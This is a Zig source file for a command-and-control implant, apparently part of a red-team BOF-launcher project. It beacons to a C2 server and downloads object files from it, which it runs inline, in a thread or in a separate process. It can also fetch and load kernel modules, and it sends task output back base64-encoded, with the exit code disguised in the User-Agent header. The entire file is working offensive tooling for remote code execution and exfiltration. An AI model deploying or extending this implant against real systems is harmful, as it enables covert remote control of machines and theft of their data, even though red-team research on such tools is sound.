const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");

pub const std_options = .{
    .http_disable_tls = true,
    .log_level = .info,
};
const c2_host = "127.0.0.1:8000";
const c2_endpoint = "/endpoint";
const jitter = 3;

const debug_proxy_enabled = false;
const debug_proxy_host = "127.0.0.1";
const debug_proxy_port = 8080;

const ImplantActions = struct {
    const Self = @This();

    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,

    pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
        const fields = @typeInfo(Self).Struct.fields;

        var ptr_table: [fields.len]usize = undefined;

        inline for (fields, 0..) |_, i| {
            ptr_table[i] = @intFromPtr(self) + i * @sizeOf(usize);
        }

        inline for (fields, 0..) |field, i| {
            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field.name));
        }
    }
};

var implant_actions: ImplantActions = .{};

fn fetchBlob(allocator: std.mem.Allocator, state: *State, blob_uri: []const u8) ![]const u8 {
    const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, blob_uri });
    defer allocator.free(uri);

    const blob_url = try std.Uri.parse(uri);

    var server_header_buffer: [1024]u8 = undefined;
    var blob_req = try state.http_client.open(.GET, blob_url, .{ .server_header_buffer = &server_header_buffer });
    defer blob_req.deinit();

    try blob_req.send();
    try blob_req.wait();

    if (blob_req.response.status != .ok) {
        std.log.err("[fetchBlob] Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(blob_req.response.status),
            blob_req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const blob_content_type = blob_req.response.content_type orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    if (!std.ascii.eqlIgnoreCase(blob_content_type, "application/octet-stream")) {
        std.log.err(
            "Expected 'Content-Type: application/octet-stream' got '{s}'",
            .{blob_content_type},
        );
        return error.NetworkError;
    }

    const blob_content = try allocator.alloc(u8, @intCast(blob_req.response.content_length.?));
    errdefer allocator.free(blob_content);

    const n = try blob_req.readAll(blob_content);
    if (n != blob_content.len)
        return error.NetworkError;

    return blob_content;
}

const State = struct {
    base64_decoder: std.base64.Base64Decoder,
    base64_encoder: std.base64.Base64Encoder,
    http_client: std.http.Client,
    heartbeat_authz: []u8,
    heartbeat_uri: std.Uri,
    pending_bofs: std.ArrayList(PendingBof),
    persistent_bofs: std.AutoHashMap(u64, bof.Object),

    fn init(allocator: std.mem.Allocator) !State {
        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
        const arch_name = target.cpu.model.name;
        const os_name = @tagName(target.os.tag);

        // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
        const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
        defer allocator.free(authz);

        const heartbeat_authz = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
        _ = std.base64.Base64Encoder.encode(&base64_encoder, heartbeat_authz, authz);

        const http_proxy = if (debug_proxy_enabled) blk: {
            const proxy = try allocator.create(std.http.Client.Proxy);
            proxy.* = .{
                .protocol = .plain,
                .authorization = null,
                .host = debug_proxy_host,
                .port = debug_proxy_port,
                .supports_connect = true,
            };
            break :blk proxy;
        } else null;

        const http_client: std.http.Client = .{
            .allocator = allocator,
            .http_proxy = http_proxy,
        };

        return State{
            .base64_decoder = base64_decoder,
            .base64_encoder = base64_encoder,
            .http_client = http_client,
            .heartbeat_authz = heartbeat_authz,
            .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
            .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
        };
    }

    fn deinit(state: *State, allocator: std.mem.Allocator) void {
        allocator.free(state.heartbeat_authz);
        state.http_client.deinit();
        state.pending_bofs.deinit();
        state.persistent_bofs.deinit();
        state.* = undefined;
    }
};

const PendingBof = struct {
    context: ?*bof.Context = null,
    request_id: []const u8,
    is_persistent: bool = false,
    launcher_error_code: i32 = 0,
};

fn generateUserAgentString(allocator: std.mem.Allocator, bof_exit_code_or_launcher_error: i32) ![]const u8 {
    return try std.fmt.allocPrint(allocator, "result:{d}", .{bof_exit_code_or_launcher_error});
}

fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
    const bof_argv = if (root.object.get("argv")) |value| bof_argv: {
        const len = try state.base64_decoder.calcSizeForSlice(value.string);
        const bof_argv = try allocator.alloc(u8, len);
        errdefer allocator.free(bof_argv);
        _ = try state.base64_decoder.decode(bof_argv, value.string);
        break :bof_argv bof_argv;
    } else null;
    defer if (bof_argv) |args| allocator.free(args);

    // process header { exec_mode, args_spec, hash, [persistence] }
    const bof_header = root.object.get("header").?.string;
    var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');

    // get hint regarding execution mode
    const exec_mode = bof_header_iter.next() orelse return error.BadData;

    // get arguments specification string
    const args_spec = bof_header_iter.next() orelse return error.BadData;

    // get BOF's hash
    const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
    std.log.info("Received hash: 0x{x}", .{hash});

    // keep BOF in memory after running it?
    const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;

    var is_loaded: bool = false;
    var bof_to_exec: bof.Object = undefined;
    if (state.persistent_bofs.get(hash)) |b| {
        std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
        bof_to_exec = b;
        is_loaded = true;
    } else {
        // we need to fetch BOF file content from C2 sever
        const bof_path = root.object.get("path").?.string;
        const bof_content = try fetchBlob(allocator, state, bof_path);
        defer allocator.free(bof_content);

        bof_to_exec = try bof.Object.initFromMemory(bof_content);
        errdefer bof_to_exec.release();

        if (is_persistent) {
            try state.persistent_bofs.put(hash, bof_to_exec);
            std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
        }
    }

    var bof_context: ?*bof.Context = null;
    errdefer if (bof_context) |context| context.release();

    std.log.info("bof_argv: {any}", .{bof_argv.?});

    const bof_args = try bof.Args.init();
    defer bof_args.release();

    var iter = std.mem.tokenizeScalar(u8, bof_argv.?, ' ');
    var i: u32 = 0;

    // build 'bof_args' by parsing 'argv' and inspecting args_spec:
    // possible values for args_spec: iszZb
    bof_args.begin();
    while (iter.next()) |arg| {
        std.log.info("Adding arg: {s}", .{arg});

        if (args_spec[i] == 'b') {
            const buf = if (root.object.get(arg)) |value| buf: {
                const len = try state.base64_decoder.calcSizeForSlice(value.string);
                const buf = try allocator.alloc(u8, len);
                errdefer allocator.free(buf);
                _ = try state.base64_decoder.decode(buf, value.string);
                break :buf buf;
            } else null;
            defer if (buf) |b| allocator.free(b);

            std.log.info("buf: {s} {s}", .{ arg, buf.? });

            const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");

            const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
            defer allocator.free(buf_len);

            try bof_args.add(buf_len);
            try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
        } else {
            try bof_args.add(arg);
        }

        i += 1;
    }
    bof_args.end();

    if (std.mem.eql(u8, exec_mode, "inline")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.run(bof_args.getBuffer());
    } else if (std.mem.eql(u8, exec_mode, "thread")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncThread(
            bof_args.getBuffer(),
            null,
            null,
        );
    } else if (std.mem.eql(u8, exec_mode, "process")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncProcess(
            bof_args.getBuffer(),
            null,
            null,
        );
    }
    // callback is a special mode of operation that behaves as follows:
    // 1. check if given BOF has go(...) function if so -> 2; else -> 3
    // 2. execute go() as inline BOF (this implies creating bof.Context object)
    // 3. call global_func_table.getPointers(bof) to provide BOF-stager's with implementation
    // BOF isn't executed (i.e. bof.Context isn't created). It provides one or more
    // function implementations for global_func_table. BOF is implicitly added to state.persistent_bofs.
    else if (std.mem.eql(u8, exec_mode, "callback")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        implant_actions.attachFunctionality(bof_to_exec);

        try state.persistent_bofs.put(hash, bof_to_exec);

        // BOF contains go(...) function, so execute it
        if (bof_to_exec.getProcAddress("go") != null) {
            bof_context = try bof_to_exec.run(bof_args.getBuffer());
        } else {
            // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
            return;
        }
    }

    if (bof_context) |context| {
        try state.pending_bofs.append(.{
            .context = context,
            .request_id = try allocator.dupe(u8, root.object.get("id").?.string),
            .is_persistent = is_persistent,
        });
    } else return error.FailedToRunBof;
}

fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
    // send heartbeat to C2 and check if any tasks are pending
    var server_header_buffer: [1024]u8 = undefined;
    var req = try state.http_client.open(.GET, state.heartbeat_uri, .{
        .server_header_buffer = &server_header_buffer,
        .extra_headers = &.{.{ .name = "authorization", .value = state.heartbeat_authz }},
    });
    defer req.deinit();

    try req.send();
    try req.wait();

    if (req.response.status != .ok) {
        std.log.err("processCommands: Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(req.response.status),
            req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    var iter = req.response.iterateHeaders();
    var content_type: std.http.Header = undefined;
    while (iter.next()) |hdr| {
        if (std.mem.eql(u8, hdr.name, "Content-Type")) {
            content_type = hdr;
            break;
        }
    }

    // task received from C2?
    if (std.ascii.eqlIgnoreCase(content_type.value, "application/json")) {
        const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
        defer allocator.free(resp_content);

        _ = try req.readAll(resp_content);

        var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
        defer parsed.deinit();

        // check type of task to execute:
        // bof - fetch and execute bof
        // cmd - execute builtin command (like: sleep <sec>; release_persistent_bofs)
        // TODO: kmod - fetch and load kernel module
        // TODO: bin - execute chosen shellcode
        var root = parsed.value;
        const task = root.object.get("name").?.string;
        const request_id = root.object.get("id").?.string;

        var iter_task = std.mem.splitScalar(u8, task, ':');
        const cmd_prefix = iter_task.next() orelse return error.BadData;
        const cmd_name = iter_task.next() orelse return error.BadData;

        // tasked for BOF execution?
        if (std.mem.eql(u8, cmd_prefix, "bof")) {
            std.log.info("Executing bof: {s}", .{cmd_name});

            receiveAndLaunchBof(allocator, state, root) catch |err| {
                try state.pending_bofs.append(.{
                    .request_id = try allocator.dupe(u8, request_id),
                    // TODO: Error codes may change in Zig, this is hacky.
                    .launcher_error_code = @abs(@intFromError(err)) - 1000,
                });
            };
        // tasked for kernel module loading?
        } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
            if (implant_actions.kmodLoad == null) {
                std.log.info("Kernel module loading not implemented", .{});
                return error.BadData;
            }

            const kmod_path = root.object.get("path").?.string;
            const kmod_content = try fetchBlob(allocator, state, kmod_path);
            defer allocator.free(kmod_content);

            std.log.info("Loading kernel module: {s}", .{cmd_name});
            _ = implant_actions.kmodLoad.?(kmod_content.ptr, kmod_content.len, "paaarams");
        } else if (std.mem.eql(u8, cmd_prefix, "kmodrm")) {
           if (implant_actions.kmodLoad == null) {
                std.log.info("Kernel module loading not implemented", .{});
                return error.BadData;
            }

            std.log.info("Removing kernel module: {s}", .{cmd_name});
            _ = implant_actions.kmodRemove.?(@ptrCast(cmd_name.ptr), 0);

        // tasked for custom command execution?
        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
            std.log.info("Executing builtin command: {s}", .{cmd_name});

            // tasked to execute cmd:release_persistent_bofs
            if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
                var it = state.persistent_bofs.valueIterator();
                while (it.next()) |v| {
                    const bof_object = v.*;
                    bof_object.release();
                }
                state.persistent_bofs.clearAndFree();
            }
        }
    }
}

fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
    var pending_bof_index: usize = 0;
    while (pending_bof_index != state.pending_bofs.items.len) {
        const pending_bof = state.pending_bofs.items[pending_bof_index];

        if (pending_bof.context != null and pending_bof.context.?.isRunning()) {
            pending_bof_index += 1;
        } else {
            const bof_exit_code_or_launcher_error: i32 = if (pending_bof.context) |context|
                @intCast(context.getExitCode())
            else
                pending_bof.launcher_error_code;

            const result_str = try generateUserAgentString(allocator, bof_exit_code_or_launcher_error);
            defer allocator.free(result_str);

            var server_header_buffer: [1024]u8 = undefined;
            var request = try state.http_client.open(.POST, state.heartbeat_uri, .{
                .server_header_buffer = &server_header_buffer,
                .extra_headers = &.{
                    .{ .name = "content-type", .value = "text/plain" },
                    .{ .name = "user-agent", .value = result_str },
                    .{ .name = "authorization", .value = pending_bof.request_id },
                },
            });
            defer request.deinit();

            if (pending_bof.context) |context| {
                if (context.getOutput()) |output| {
                    const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
                    defer allocator.free(out_b64);

                    _ = state.base64_encoder.encode(out_b64, output);

                    request.transfer_encoding = .{ .content_length = out_b64.len };

                    try request.send();
                    try request.writeAll(out_b64);
                    try request.finish();

                    std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                    std.log.info("Bof output sent:\n{s}", .{output});
                } else {
                    try request.send();

                    std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                }

                if (!pending_bof.is_persistent)
                    context.getObject().release();

                context.release();
            } else {
                try request.send();

                std.log.info("Bof launcher error code sent: {d}", .{bof_exit_code_or_launcher_error});
            }
            try request.wait();

            allocator.free(pending_bof.request_id);
            _ = state.pending_bofs.swapRemove(pending_bof_index);
        }
    }
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var state = try State.init(allocator);
    defer state.deinit(allocator);

    try bof.initLauncher();
    defer bof.releaseLauncher();

    while (true) {
        processCommands(allocator, &state) catch {};
        processPendingBofs(allocator, &state) catch {};
        std.time.sleep(jitter * 1e9);
    }
}
